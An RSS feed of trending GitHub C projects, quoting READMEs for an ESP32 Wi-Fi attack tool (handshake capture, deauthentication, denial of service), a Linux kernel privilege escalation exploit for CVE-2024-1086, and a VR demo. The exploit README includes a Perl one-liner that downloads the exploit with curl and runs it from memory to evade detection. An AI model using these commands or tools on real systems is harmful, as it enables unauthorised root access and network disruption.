<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Weekly Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-04-07T01:49:46Z</updated>
  <subtitle>Weekly Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>risinek/esp32-wifi-penetration-tool</title>
    <updated>2024-04-07T01:49:46Z</updated>
    <id>tag:github.com,2024-04-07:/risinek/esp32-wifi-penetration-tool</id>
    <link href="https://github.com/risinek/esp32-wifi-penetration-tool" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Exploring possibilities of ESP32 platform to attack on nearby Wi-Fi networks.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;ESP32 Wi-Fi Penetration Tool&lt;/h1&gt; &#xA;&lt;p&gt;This project introduces an universal tool for ESP32 platform for implementing various Wi-Fi attacks. It provides some common functionality that is commonly used in Wi-Fi attacks and makes implementing new attacks a bit simpler. It also includes Wi-Fi attacks itself like capturing PMKIDs from handshakes, or handshakes themselves by different methods like starting rogue duplicated AP or sending deauthentication frames directly, etc...&lt;/p&gt; &#xA;&lt;p&gt;Obviously cracking is not part of this project, as ESP32 is not sufficient to crack hashes in effective way. The rest can be done on this small, cheap, low-power SoC.&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/risinek/esp32-wifi-penetration-tool/master/doc/images/logo.png&#34; alt=&#34;Logo&#34;&gt; &lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;PMKID capture&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;WPA/WPA2 handshake capture&lt;/strong&gt; and parsing&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Deauthentication attacks&lt;/strong&gt; using various methods&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Denial of Service attacks&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;Formatting captured traffic into &lt;strong&gt;PCAP format&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;Parsing captured handshakes into &lt;strong&gt;HCCAPX file&lt;/strong&gt; ready to be cracked by Hashcat&lt;/li&gt; &#xA; &lt;li&gt;Passive handshake sniffing&lt;/li&gt; &#xA; &lt;li&gt;Easily extensible framework for new attacks implementations&lt;/li&gt; &#xA; &lt;li&gt;Management AP for easy configuration on the go using smartphone for example&lt;/li&gt; &#xA; &lt;li&gt;And more...&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Demo video&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=9I3BxRu86GE&#34;&gt;&lt;img src=&#34;https://img.youtube.com/vi/9I3BxRu86GE/0.jpg&#34; alt=&#34;Demonstration Youtube video&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/risinek/esp32-wifi-penetration-tool/master/#Build&#34;&gt;Build&lt;/a&gt; and &lt;a href=&#34;https://raw.githubusercontent.com/risinek/esp32-wifi-penetration-tool/master/#Flash&#34;&gt;flash&lt;/a&gt; project onto ESP32 (DevKit or module)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Power ESP32&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Management AP is started automatically after boot&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Connect to this AP&lt;br&gt; By default: &lt;em&gt;SSID:&lt;/em&gt; &lt;code&gt;ManagementAP&lt;/code&gt; and &lt;em&gt;password:&lt;/em&gt; &lt;code&gt;mgmtadmin&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;In browser open &lt;code&gt;192.168.4.1&lt;/code&gt; and you should see a web client to configure and control tool like this:&lt;/p&gt; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/risinek/esp32-wifi-penetration-tool/master/doc/images/ui-config.png&#34; alt=&#34;Web client UI&#34;&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;Build&lt;/h2&gt; &#xA;&lt;p&gt;This project is currently developed using ESP-IDF 4.1 (commit &lt;code&gt;5ef1b390026270503634ac3ec9f1ec2e364e23b2&lt;/code&gt;). It may be broken on newer version.&lt;/p&gt; &#xA;&lt;p&gt;Project can be built in the usual ESP-IDF way:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;idf.py build&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Legacy method using &lt;code&gt;make&lt;/code&gt; is not supported by this project.&lt;/p&gt; &#xA;&lt;h2&gt;Flash&lt;/h2&gt; &#xA;&lt;p&gt;If you have setup ESP-IDF, the easiest way is to use &lt;code&gt;idf.py flash&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;In case you don&#39;t want to setup whole ESP-IDF, you can use pre-build binaries included in &lt;a href=&#34;https://raw.githubusercontent.com/risinek/esp32-wifi-penetration-tool/master/build/&#34;&gt;&lt;code&gt;build/&lt;/code&gt;&lt;/a&gt; and flash them using &lt;a href=&#34;https://github.com/espressif/esptool&#34;&gt;&lt;code&gt;esptool.py&lt;/code&gt;&lt;/a&gt; (requires Python).&lt;/p&gt; &#xA;&lt;p&gt;Example command (follow instructions in &lt;a href=&#34;https://github.com/espressif/esptool&#34;&gt;esptool repo&lt;/a&gt;):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;esptool.py -p /dev/ttyS5 -b 115200 --after hard_reset write_flash --flash_mode dio --flash_freq 40m --flash_size detect 0x8000 build/partition_table/partition-table.bin 0x1000 build/bootloader/bootloader.bin 0x10000 build/esp32-wifi-penetration-tool.bin&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On Windows you can use official &lt;a href=&#34;https://www.espressif.com/en/support/download/other-tools&#34;&gt;Flash Download Tool&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;h3&gt;Wi-Fi attacks&lt;/h3&gt; &#xA;&lt;p&gt;Attacks implementations in this project are described in &lt;a href=&#34;https://raw.githubusercontent.com/risinek/esp32-wifi-penetration-tool/master/main/&#34;&gt;main component README&lt;/a&gt;. Theory behind these attacks is located in &lt;a href=&#34;https://raw.githubusercontent.com/risinek/esp32-wifi-penetration-tool/master/doc/ATTACKS_THEORY.md&#34;&gt;doc/ATTACKS_THEORY.md&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;API reference&lt;/h3&gt; &#xA;&lt;p&gt;This project uses Doxygen notation for documenting components API and implementation. Doxyfile is included so if you want to generate API reference, just run &lt;code&gt;doxygen&lt;/code&gt; from root directory. It will generate HTML API reference into &lt;code&gt;doc/api/html&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Components&lt;/h3&gt; &#xA;&lt;p&gt;This project consists of multiple components, that can be reused in other projects. Each component has it&#39;s own README with detailed description. Here comes brief description of components:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/risinek/esp32-wifi-penetration-tool/master/main&#34;&gt;&lt;strong&gt;Main&lt;/strong&gt;&lt;/a&gt; component is entry point for this project. All neccessary initialisation steps are done here. Management AP is started and the control is handed to webserver.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/risinek/esp32-wifi-penetration-tool/master/components/wifi_controller&#34;&gt;&lt;strong&gt;Wifi Controller&lt;/strong&gt;&lt;/a&gt; component wraps all Wi-Fi related operations. It&#39;s used to start AP, connect as STA, scan nearby APs etc.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/risinek/esp32-wifi-penetration-tool/master/components/webserver&#34;&gt;&lt;strong&gt;Webserver&lt;/strong&gt;&lt;/a&gt; component provides web UI to configure attacks. It expects that AP is started and no additional security features like SSL encryption are enabled.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/risinek/esp32-wifi-penetration-tool/master/components/wsl_bypasser&#34;&gt;&lt;strong&gt;Wi-Fi Stack Libraries Bypasser&lt;/strong&gt;&lt;/a&gt; component bypasses Wi-Fi Stack Libraries restriction to send some types of arbitrary 802.11 frames.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/risinek/esp32-wifi-penetration-tool/master/components/frame_analyzer&#34;&gt;&lt;strong&gt;Frame Analyzer&lt;/strong&gt;&lt;/a&gt; component processes captured frames and provides parsing functionality to other components.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/risinek/esp32-wifi-penetration-tool/master/components/pcap_serializer&#34;&gt;&lt;strong&gt;PCAP Serializer&lt;/strong&gt;&lt;/a&gt; component serializes captured frames into PCAP binary format and provides it to other components (mostly for webserver/UI)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/risinek/esp32-wifi-penetration-tool/master/components/hccapx_serializer&#34;&gt;&lt;strong&gt;HCCAPX Serializer&lt;/strong&gt;&lt;/a&gt; component serializes captured frames into HCCAPX binary format and provides it to other components (mostly for webserver/UI)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Further reading&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://excel.fit.vutbr.cz/submissions/2021/048/48.pdf&#34;&gt;Academic paper about this project (PDF)&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Hardware&lt;/h2&gt; &#xA;&lt;p&gt;This project was mostly build and tested on &lt;strong&gt;ESP32-DEVKITC-32E&lt;/strong&gt; but there should not be any differences for any &lt;strong&gt;ESP32-WROOM-32&lt;/strong&gt; modules.&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/risinek/esp32-wifi-penetration-tool/master/doc/images/soucastky_8b.png&#34; alt=&#34;Hw components&#34; width=&#34;400&#34;&gt; &lt;/p&gt; &#xA;&lt;p&gt;On the following pictures you can see a battery (Li-Pol accumulator) powered ESP32 DevKitC using following hardware:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;ESP32-DEVKITC-32E&lt;/strong&gt; (cost 213 CZK/8.2 EUR/9.6 USD)&lt;/li&gt; &#xA; &lt;li&gt;220mAh Li-Pol 3.7V accumulator (weights ±5g, cost 77 CZK/3 EUR/3.5 USD)&lt;/li&gt; &#xA; &lt;li&gt;MCP1702-3302ET step-down 3.3V voltage regulator (cost 11 CZK/0.42 EUR/0.50 USD)&lt;/li&gt; &#xA; &lt;li&gt;Czech 5-koruna coin for scale (weights 4.8g, diameter 23 mm, cost 0.19 EUR/0.23 USD)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/risinek/esp32-wifi-penetration-tool/master/doc/images/mini.jpg&#34; alt=&#34;Hw components&#34; width=&#34;300&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/risinek/esp32-wifi-penetration-tool/master/doc/images/mini2.jpg&#34; alt=&#34;Hw components&#34; width=&#34;300&#34;&gt; &lt;/p&gt; &#xA;&lt;p&gt;Altogether (without coin) this setup weights around 17g. This can be further downsized by using smaller Li-Pol accumulator and using ESP32-WROOM-32 modul directly instead of whole dev board.&lt;/p&gt; &#xA;&lt;p&gt;This setup cost me around 300 CZK (± 11.50 EUR/13.50 USD). Using the modul directly that costs around 80 CZK (± 3 EUR/3.5 USD) we can get to price of 160 CZK (± 6.5 EUR/7.5 USD) which makes this tool really cheap and available to almost everybody.&lt;/p&gt; &#xA;&lt;h3&gt;Power consumption&lt;/h3&gt; &#xA;&lt;p&gt;Based on experimental measurements, ESP32 consumes around 100mA during attack executions.&lt;/p&gt; &#xA;&lt;h2&gt;Similar projects&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/GANESH-ICMC/esp32-deauther&#34;&gt;GANESH-ICMC/esp32-deauther&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/SpacehuhnTech/esp8266_deauther&#34;&gt;SpacehuhnTech/esp8266_deauther&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/justcallmekoko/ESP32Marauder&#34;&gt;justcallmekoko/ESP32Marauder&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.tindie.com/products/klhnikov/esp32-network-toolbox/&#34;&gt;EParisot/esp32-network-toolbox&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Jeija/esp32free80211&#34;&gt;Jeija/esp32free80211&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;Feel free to contribute. Don&#39;t hestitate to refactor current code base. Please stick to Doxygen notation when commenting new functions and files. This project is mainly build for educational and demonstration purposes, so verbose documentation is welcome.&lt;/p&gt; &#xA;&lt;h2&gt;Disclaimer&lt;/h2&gt; &#xA;&lt;p&gt;This project demonstrates vulnerabilities of Wi-Fi networks and its underlaying 802.11 standard and how ESP32 platform can be utilised to attack on those vulnerable spots. Use responsibly against networks you have permission to attack on.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;Even though this project is licensed under MIT license (see &lt;a href=&#34;https://raw.githubusercontent.com/risinek/esp32-wifi-penetration-tool/master/LICENSE&#34;&gt;LICENSE&lt;/a&gt; file for details), don&#39;t be shy or greedy and share your work.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>Notselwyn/CVE-2024-1086</title>
    <updated>2024-04-07T01:49:46Z</updated>
    <id>tag:github.com,2024-04-07:/Notselwyn/CVE-2024-1086</id>
    <link href="https://github.com/Notselwyn/CVE-2024-1086" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Universal local privilege escalation Proof-of-Concept exploit for CVE-2024-1086, working on most Linux kernels between v5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;CVE-2024-1086&lt;/h1&gt; &#xA;&lt;p&gt;Universal local privilege escalation Proof-of-Concept exploit for &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2024-1086&#34;&gt;CVE-2024-1086&lt;/a&gt;, working on most Linux kernels between v5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Notselwyn/CVE-2024-1086/assets/68616630/a3d43951-94ab-4c09-a14b-07b81f89b3de&#34;&gt;https://github.com/Notselwyn/CVE-2024-1086/assets/68616630/a3d43951-94ab-4c09-a14b-07b81f89b3de&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Blogpost / Write-up&lt;/h2&gt; &#xA;&lt;p&gt;A full write-up of the exploit - including background information and loads of useful diagrams - can be found in the &lt;a href=&#34;https://pwning.tech/nftables/&#34;&gt;Flipping Pages blogpost&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Affected versions&lt;/h2&gt; &#xA;&lt;p&gt;The exploit affects versions from (including) v5.14 to (including) v6.6, excluding patched branches v5.15.149&amp;gt;, v6.1.76&amp;gt;, v6.6.15&amp;gt;. The patch for these versions were released in feb 2024. The underlying vulnerability affects all versions (excluding patched stable branches) from v3.15 to v6.8-rc1.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Caveats:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The exploit does not work v6.4&amp;gt; kernels with kconfig &lt;code&gt;CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y&lt;/code&gt; (including Ubuntu v6.5)&lt;/li&gt; &#xA; &lt;li&gt;The exploits requires user namespaces (kconfig &lt;code&gt;CONFIG_USER_NS=y&lt;/code&gt;), that those user namespaces are unprivileged (sh command &lt;code&gt;sysctl kernel.unprivileged_userns_clone&lt;/code&gt; = 1), and that nf_tables is enabled (kconfig &lt;code&gt;CONFIG_NF_TABLES=y&lt;/code&gt;). By default, these are all enabled on Debian, Ubuntu, and KernelCTF. Other distro&#39;s have not been tested, but may work as well.&lt;/li&gt; &#xA; &lt;li&gt;The exploit may be &lt;em&gt;very&lt;/em&gt; unstable on systems with a lot of network activity &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Systems with WiFi adapter, when surrounded by high-usage WiFi networks, will be very unstable.&lt;/li&gt; &#xA;   &lt;li&gt;On test devices, please turn off WiFi adapters through BIOS.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;The kernel panic (system crash) after running the exploit is a side-effect which deliberately hasn&#39;t been fixed to prevent malicious usage of the exploit (i.e. exploitation attempts should now be more noticable, and unpractical in real-world operations). Despite this, it still allows for a working proof-of-concept in lab environments, as the root shell is functional, and persistance through disk is possible.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;h3&gt;Configuration&lt;/h3&gt; &#xA;&lt;p&gt;The default values should work out of the box on Debian, Ubuntu, and KernelCTF with a local shell. On non-tested setups/distros, please make sure the kconfig values match with the target kernel. These can be specified in &lt;a href=&#34;https://raw.githubusercontent.com/Notselwyn/CVE-2024-1086/main/src/config.h&#34;&gt;&lt;code&gt;src/config.h&lt;/code&gt;&lt;/a&gt;. If you are running the exploit on a machine with more than 32GiB physical memory, make sure to increase &lt;code&gt;CONFIG_PHYS_MEM&lt;/code&gt;. If you are running the exploit over SSH (into the test machine) or a reverse shell, you may want to toggle &lt;code&gt;CONFIG_REDIRECT_LOG&lt;/code&gt; to &lt;code&gt;1&lt;/code&gt; to avoid unnecessary network activity.&lt;/p&gt; &#xA;&lt;h3&gt;Building&lt;/h3&gt; &#xA;&lt;p&gt;If this is impractical for you, there is an &lt;a href=&#34;https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0.0/exploit&#34;&gt;compiled x64 binary&lt;/a&gt; with the default config.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/Notselwyn/CVE-2024-1086&#xA;cd CVE-2024-1086&#xA;make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Binary: &lt;code&gt;CVE-2024-1086/exploit&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Running&lt;/h3&gt; &#xA;&lt;p&gt;Running the exploit is just as trivial:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./exploit&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Fileless execution is also supported, in case of pentest situations where detections need to be avoided. However, Perl needs to be installed on the target:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;perl -e &#39;&#xA;  require qw/syscall.ph/;&#xA;&#xA;  my $fd = syscall(SYS_memfd_create(), $fn, 0);&#xA;  system &#34;curl https://example.com/exploit -s &amp;gt;&amp;amp;$fd&#34;;&#xA;  exec {&#34;/proc/$$/fd/$fd&#34;} &#34;memfd&#34;;&#xA;&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Disclaimer&lt;/h2&gt; &#xA;&lt;p&gt;The programs and scripts (&#34;programs&#34;) in this software directory/folder/repository (&#34;repository&#34;) are published, developed and distributed for educational/research purposes only. I (&#34;the creator&#34;) do not condone any malicious or illegal usage of the programs in this repository, as the intend is sharing research and not doing illegal activities with it. I am not legally responsible for anything you do with the programs in this repository.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>SentientArt/TheBasement</title>
    <updated>2024-04-07T01:49:46Z</updated>
    <id>tag:github.com,2024-04-07:/SentientArt/TheBasement</id>
    <link href="https://github.com/SentientArt/TheBasement" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Barney&#39;s Basement&lt;/h1&gt; &#xA;&lt;p&gt;Hello and Welcome to the project Barney&#39;s Basement.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;This is the developer version of the project, the Demo is available &lt;a href=&#34;https://drive.google.com/file/d/1gsVNnXIprNSPVxAvGX9uzUpOJpbXd6J2/view?usp=drive_link&#34;&gt;Here&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Please be aware that this project is still under development!&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h2&gt;About us&lt;/h2&gt; &#xA;&lt;p&gt;This project is being developped by Sentient Art and its team. If you would like to know more about us, check us out on our socials and website:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.sentient-art.xyz&#34;&gt;Website&lt;/a&gt;, &lt;a href=&#34;https://www.artstation.com/sentient-art&#34;&gt;Artstation&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/sentient_art&#34;&gt;X(Twitter)&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;What is Barney&#39;s Basement (The Basement)?&lt;/h2&gt; &#xA;&lt;p&gt;Barney&#39;s Basement is a project made by professionals of the industry, it represents the sum of our knowledge in terms of art and code. This project is a full VR demo made in unreal engine 5. It contains more than 150 props, 15 Materials, a full Lumen/Nanite Scene and a full grab system for VR.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://i.ibb.co/g6hz3zS/Highres-Screenshot00043.png&#34; alt=&#34;Image of Barney&#39;s Basement&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Product under Development&lt;/h2&gt; &#xA;&lt;p&gt;Please, be aware that this content is still under development.&lt;/p&gt; &#xA;&lt;h2&gt;How to launch this project&lt;/h2&gt; &#xA;&lt;p&gt;Make sure you have Unreal Engine 5.3.2 Installed on your computer before launching this project.&lt;/p&gt; &#xA;&lt;h2&gt;Licensing and Usage&lt;/h2&gt; &#xA;&lt;p&gt;This project is under MIT Licensing Copyright (c) 2024 SASU Sentient Art&lt;/p&gt; &#xA;&lt;p&gt;Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the &#34;Software&#34;), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:&lt;/p&gt; &#xA;&lt;p&gt;The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.&lt;/p&gt; &#xA;&lt;p&gt;THE SOFTWARE IS PROVIDED &#34;AS IS&#34;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.&lt;/p&gt;</summary>
  </entry>
</feed>